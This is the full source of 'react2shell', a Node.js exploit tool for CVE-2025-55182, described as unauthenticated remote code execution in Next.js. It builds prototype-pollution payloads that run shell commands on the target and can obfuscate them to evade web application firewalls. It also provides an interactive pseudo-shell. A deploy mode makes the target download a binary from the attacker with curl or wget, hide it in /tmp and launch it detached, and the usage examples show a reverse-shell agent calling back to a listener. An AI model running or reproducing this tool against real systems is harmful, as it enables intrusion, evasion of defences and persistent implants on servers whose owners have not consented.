#!/usr/bin/env node
// react2shell - CVE-2025-55182 exploit
// Unauthenticated RCE in Next.js via RSC payload injection.
// Optionally deploys a binary (reverse shell agent, implant, etc.) to the target.
// Copyright (c) 2026 Allan Kimmer Jensen
// https://github.com/Saturate/react2shell
// MIT License

import { createServer } from "node:http";
import { request as httpRequest } from "node:http";
import { request as httpsRequest } from "node:https";
import { statSync, createReadStream } from "node:fs";
import { basename, resolve } from "node:path";
import { createInterface } from "node:readline";
import { randomBytes } from "node:crypto";
import { networkInterfaces } from "node:os";

// -- colors ----------------------------------------------------------------

const c = {
  r: "\x1b[0m",
  red: "\x1b[91m",
  green: "\x1b[92m",
  yellow: "\x1b[93m",
  blue: "\x1b[94m",
  magenta: "\x1b[95m",
  cyan: "\x1b[96m",
  dim: "\x1b[90m",
};

const info = (msg) => console.log(`${c.blue}[*]${c.r} ${msg}`);
const ok = (msg) => console.log(`${c.green}[+]${c.r} ${msg}`);
const warn = (msg) => console.log(`${c.yellow}[!]${c.r} ${msg}`);
const fail = (msg) => console.log(`${c.red}[-]${c.r} ${msg}`);
const rule = () => console.log(`${c.magenta}${"─".repeat(60)}${c.r}`);

// -- payload ---------------------------------------------------------------

function rcePayload(command, { blind = false } = {}) {
  const lit = JSON.stringify(command);

  const prefix = blind
    ? `process.mainModule.require('child_process').execSync(${lit});`
    : [
        `var res=process.mainModule.require('child_process')`,
        `.execSync(${lit},{timeout:5000}).toString().trim();`,
        `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:\`\${res}\`});`,
      ].join("");

  return JSON.stringify({
    then: "$1:__proto__:then",
    status: "resolved_model",
    reason: -1,
    value: '{"then":"$B0"}',
    _response: {
      _prefix: prefix,
      _chunks: "$Q2",
      _formData: { get: "$1:constructor:constructor" },
    },
  });
}

function spawnPayload(command) {
  const lit = JSON.stringify(command);

  const prefix = [
    `var cp=process.mainModule.require('child_process');`,
    `var p=cp.spawn('sh',['-c',${lit}],{detached:true,stdio:'ignore'});`,
    `p.unref();`,
    `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'spawned pid '+p.pid});`,
  ].join("");

  return JSON.stringify({
    then: "$1:__proto__:then",
    status: "resolved_model",
    reason: -1,
    value: '{"then":"$B0"}',
    _response: {
      _prefix: prefix,
      _formData: { get: "$1:constructor:constructor" },
    },
  });
}

// -- waf bypass payload ----------------------------------------------------

function randId() {
  const alpha = "abcdefghijklmnopqrstuvwxyz";
  const alnum = alpha + "0123456789";
  let id = alpha[Math.floor(Math.random() * alpha.length)];
  for (let i = 0; i < 2; i++)
    id += alnum[Math.floor(Math.random() * alnum.length)];
  return id;
}

function splitK(s) {
  const i = 1 + Math.floor(Math.random() * (s.length - 2));
  return `'${s.slice(0, i)}'+'${s.slice(i)}'`;
}

function rcePayloadBypass(command, { blind = false } = {}) {
  const lit = JSON.stringify(command);
  const [a, b, d] = [randId(), randId(), randId()];

  const prefix = blind
    ? [
        `var ${a}=process[${splitK("mainModule")}];`,
        `${a}[${splitK("require")}](${splitK("child_process")})`,
        `[${splitK("execSync")}](${lit});`,
      ].join("")
    : [
        `var ${a}=process[${splitK("mainModule")}];`,
        `var ${b}=${a}[${splitK("require")}](${splitK("child_process")});`,
        `var ${d}=${b}[${splitK("execSync")}](${lit},{timeout:5000}).toString().trim();`,
        `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:\`\${${d}}\`});`,
      ].join("");

  return JSON.stringify({
    then: "$1:__proto__:then",
    status: "resolved_model",
    reason: -1,
    value: '{"then":"$B0"}',
    _response: {
      _prefix: prefix,
      _chunks: "$Q2",
      _formData: { get: "$1:constructor:constructor" },
    },
  });
}

function spawnPayloadBypass(command) {
  const lit = JSON.stringify(command);
  const [a, b] = [randId(), randId()];

  const prefix = [
    `var ${a}=process[${splitK("mainModule")}]`,
    `[${splitK("require")}](${splitK("child_process")});`,
    `var ${b}=${a}[${splitK("spawn")}]('sh',['-c',${lit}],{detached:true,stdio:'ignore'});`,
    `${b}.unref();`,
    `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'spawned pid '+${b}.pid});`,
  ].join("");

  return JSON.stringify({
    then: "$1:__proto__:then",
    status: "resolved_model",
    reason: -1,
    value: '{"then":"$B0"}',
    _response: {
      _prefix: prefix,
      _formData: { get: "$1:constructor:constructor" },
    },
  });
}

// -- transport -------------------------------------------------------------

function freshBoundary() {
  return "----R2S" + randomBytes(12).toString("hex");
}

function multipart(payload, boundary) {
  return [
    `--${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${payload}\r\n`,
    `--${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n`,
    `--${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n`,
    `--${boundary}--\r\n`,
  ].join("");
}

function send(target, payload, timeout = 30_000) {
  return new Promise((done) => {
    const url = new URL(target);
    const tls = url.protocol === "https:";
    const boundary = freshBoundary();
    const body = multipart(payload, boundary);

    const req = (tls ? httpsRequest : httpRequest)(
      {
        hostname: url.hostname,
        port: url.port || (tls ? 443 : 80),
        path: url.pathname,
        method: "POST",
        headers: {
          "Next-Action": "x",
          Accept: "text/x-component",
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Length": Buffer.byteLength(body),
        },
        rejectUnauthorized: false,
        timeout,
      },
      (res) => {
        let data = "";
        res.on("data", (ch) => (data += ch));
        res.on("end", () => done({ status: res.statusCode, body: data }));
      }
    );

    req.on("error", (e) => done({ status: 0, body: "", error: e.message }));
    req.on("timeout", () => {
      req.destroy();
      done({ status: 0, body: "", error: "timeout" });
    });
    req.write(body);
    req.end();
  });
}

// -- parse response --------------------------------------------------------

function digest(text) {
  // the RSC error line looks like: 1:E{"digest":"command output here","message":...}
  for (const line of text.split("\n")) {
    const match = line.match(/^\d+:E(\{.*\})$/);
    if (!match) continue;
    try {
      const obj = JSON.parse(match[1]);
      if (obj.digest && !/^\d+$/.test(obj.digest)) return obj.digest;
    } catch {}
  }
  // fallback regex for non-standard responses
  const fallback = text.match(/"digest":"((?:[^"\\]|\\.)*)"/);
  if (fallback && !/^\d+$/.test(fallback[1])) return fallback[1];
  return null;
}

// -- exec / spawn ----------------------------------------------------------

async function exec(target, command, opts = {}) {
  const payload = opts.wafBypass
    ? rcePayloadBypass(command, opts)
    : rcePayload(command, opts);
  info(`cmd: ${command}`);

  const resp = await send(target, payload);
  if (resp.error) {
    fail(`request: ${resp.error}`);
    return null;
  }

  if (resp.status === 500 || resp.status === 200) {
    if (opts.blind) return "(blind)";
    const out = digest(resp.body);
    if (out) return out;
    warn("no digest in response");
    if (resp.body) info(`raw: ${resp.body.slice(0, 300)}`);
    return null;
  }

  fail(`HTTP ${resp.status}`);
  return null;
}

async function execSpawn(target, command, { wafBypass = false } = {}) {
  info(`spawn: ${command}`);
  const payload = wafBypass
    ? spawnPayloadBypass(command)
    : spawnPayload(command);
  const resp = await send(target, payload);
  if (resp.error) {
    fail(`request: ${resp.error}`);
    return null;
  }
  return digest(resp.body);
}

// -- file server -----------------------------------------------------------

function serve(filePath, port) {
  return new Promise((res, rej) => {
    const name = basename(filePath);
    const size = statSync(filePath).size;

    const srv = createServer((req, resp) => {
      if (req.url === `/${name}`) {
        info(
          `serving ${name} (${(size / 1024 / 1024).toFixed(1)} MB) -> ${req.socket.remoteAddress}`
        );
        resp.writeHead(200, {
          "Content-Type": "application/octet-stream",
          "Content-Length": size,
        });
        createReadStream(filePath).pipe(resp);
      } else {
        resp.writeHead(404).end();
      }
    });

    srv.listen(port, () => {
      ok(`serving /${name} on :${port}`);
      res({ srv, name, size });
    });
    srv.on("error", rej);
  });
}

// -- deploy ----------------------------------------------------------------

function localIp() {
  for (const devs of Object.values(networkInterfaces())) {
    for (const d of devs) {
      if (d.family === "IPv4" && !d.internal) return d.address;
    }
  }
  return "127.0.0.1";
}

async function deploy(target, opts) {
  const {
    bin,
    lhost,
    servePort = 8888,
    remoteArgs = "",
    wafBypass = false,
  } = opts;

  const exOpts = { wafBypass };

  // 1 - detect platform
  info("1/4 detecting target");
  const uname = await exec(target, "uname -sm", exOpts);
  if (!uname) {
    fail("platform detection failed");
    return false;
  }
  ok(`target: ${uname}`);

  // 2 - file server
  info("2/4 starting file server");
  let fs;
  try {
    fs = await serve(bin, servePort);
  } catch (e) {
    fail(`file server: ${e.message}`);
    return false;
  }

  // 3 - download to target
  info("3/4 downloading binary to target");
  const remote = `/tmp/.r2s-${randomBytes(4).toString("hex")}`;
  const dl = (fetcher) =>
    `${fetcher} && chmod +x ${remote} && echo ok`;

  let result;
  try {
    result = await exec(
      target,
      dl(`curl -so ${remote} http://${lhost}:${servePort}/${fs.name}`),
      exOpts
    );

    if (!result?.includes("ok")) {
      warn("curl failed, trying wget");
      result = await exec(
        target,
        dl(`wget -qO ${remote} http://${lhost}:${servePort}/${fs.name}`),
        exOpts
      );
    }
  } finally {
    fs.srv.close();
  }

  if (!result?.includes("ok")) {
    fail("download failed (target can't reach us?)");
    return false;
  }
  ok("binary on target");

  // 4 - launch detached
  info("4/4 launching binary");
  const launchCmd = `${remote} ${remoteArgs}`.trim();
  const pid = await execSpawn(target, launchCmd, { wafBypass });

  if (pid) {
    ok(pid);
    console.log();
    rule();
    console.log(`  ${c.green}deployed: ${launchCmd}${c.r}`);
    rule();
    return true;
  }

  fail("spawn may have failed");
  return false;
}

// -- interactive -----------------------------------------------------------

async function interactive(target, { wafBypass = false } = {}) {
  ok("interactive mode (exit to quit)");
  if (wafBypass) ok("waf-bypass enabled");
  console.log();

  const rl = createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: `${c.magenta}r2s${c.r}> `,
  });

  rl.prompt();

  for await (const line of rl) {
    const cmd = line.trim();
    if (!cmd) {
      rl.prompt();
      continue;
    }
    if (["exit", "quit", "q"].includes(cmd.toLowerCase())) break;

    const out = await exec(target, cmd, { wafBypass });
    if (out) {
      rule();
      console.log(out);
      rule();
    }
    console.log();
    rl.prompt();
  }

  rl.close();
}

// -- banner / cli ----------------------------------------------------------

function banner() {
  console.log(`
${c.magenta}  ┬─┐┌─┐┌─┐┌─┐┌┬┐${c.cyan}┌─┐┌─┐┬ ┬┌─┐┬  ┬  ${c.r}
${c.magenta}  ├┬┘├┤ ├─┤│   │ ${c.cyan}┌─┘└─┐├─┤├┤ │  │  ${c.r}
${c.magenta}  ┴└─└─┘┴ ┴└─┘ ┴ ${c.cyan}└─┘└─┘┴ ┴└─┘┴─┘┴─┘${c.r}
${c.dim}  CVE-2025-55182 // node.js edition${c.r}
`);
}

function usage() {
  banner();
  console.log(`Usage: react2shell.mjs -t <url> [options]

  -t, --target <url>       Target URL (required)
  -c, --command <cmd>      Execute command with output
  --blind                  Blind RCE (no output capture)
  -i, --interactive        Interactive pseudo-shell
  --waf-bypass             Obfuscate payload to evade WAF filtering

  --deploy <binary>        Upload and execute a binary on the target
  --lhost <ip>             Your IP (auto-detected if omitted)
  --serve-port <port>      HTTP port to serve the binary (default: 8888)
  --remote-args <args>     Arguments passed to the deployed binary

Examples:
  # Command with output
  ./react2shell.mjs -t http://10.10.10.5:3000 -c "id"

  # Bypass WAF filtering
  ./react2shell.mjs -t http://10.10.10.5:3000 -c "id" --waf-bypass

  # Interactive shell
  ./react2shell.mjs -t http://10.10.10.5:3000 -i

  # Deploy a Gleipnir agent
  ./react2shell.mjs -t http://10.10.10.5:3000 \\
    --deploy ./gleipnir-agent \\
    --remote-args "-H 10.10.14.5 -p 4444 --tls --cron"
`);
}

function parseArgs(argv) {
  const a = {};
  const need = (flag, i) => {
    if (i >= argv.length || argv[i] === undefined) {
      fail(`${flag} requires a value`);
      process.exit(1);
    }
    return argv[i];
  };
  for (let i = 2; i < argv.length; i++) {
    switch (argv[i]) {
      case "-t":
      case "--target":
        a.target = need(argv[i], ++i);
        break;
      case "-c":
      case "--command":
        a.command = need(argv[i], ++i);
        break;
      case "--blind":
        a.blind = true;
        break;
      case "--waf-bypass":
        a.wafBypass = true;
        break;
      case "-i":
      case "--interactive":
        a.interactive = true;
        break;
      case "--deploy":
        a.deploy = need(argv[i], ++i);
        break;
      case "--lhost":
        a.lhost = need(argv[i], ++i);
        break;
      case "--serve-port":
        a.servePort = parseInt(need(argv[i], ++i), 10);
        break;
      case "--remote-args":
        a.remoteArgs = need(argv[i], ++i);
        break;
      case "-h":
      case "--help":
        a.help = true;
        break;
      default:
        fail(`unknown option: ${argv[i]}`);
        process.exit(1);
    }
  }
  return a;
}

async function main() {
  const args = parseArgs(process.argv);

  if (args.help || !args.target) {
    usage();
    process.exit(args.help ? 0 : 1);
  }

  banner();

  let target = args.target;
  if (!target.startsWith("http")) target = `http://${target}`;
  target = target.replace(/\/+$/, "");
  info(`target: ${target}`);
  if (args.wafBypass) ok("waf-bypass mode");

  if (args.deploy) {
    const lhost = args.lhost || localIp();
    info(`lhost: ${lhost}`);
    const success = await deploy(target, {
      bin: resolve(args.deploy),
      lhost,
      servePort: args.servePort || 8888,
      remoteArgs: args.remoteArgs || "",
      wafBypass: args.wafBypass,
    });
    process.exit(success ? 0 : 1);
  }

  if (args.interactive) {
    await interactive(target, { wafBypass: args.wafBypass });
    process.exit(0);
  }

  if (args.command) {
    const out = await exec(target, args.command, {
      blind: args.blind,
      wafBypass: args.wafBypass,
    });
    if (out) {
      console.log();
      rule();
      console.log(out);
      rule();
    }
    process.exit(0);
  }

  usage();
}

main().catch((e) => {
  fail(e.message);
  process.exit(1);
});
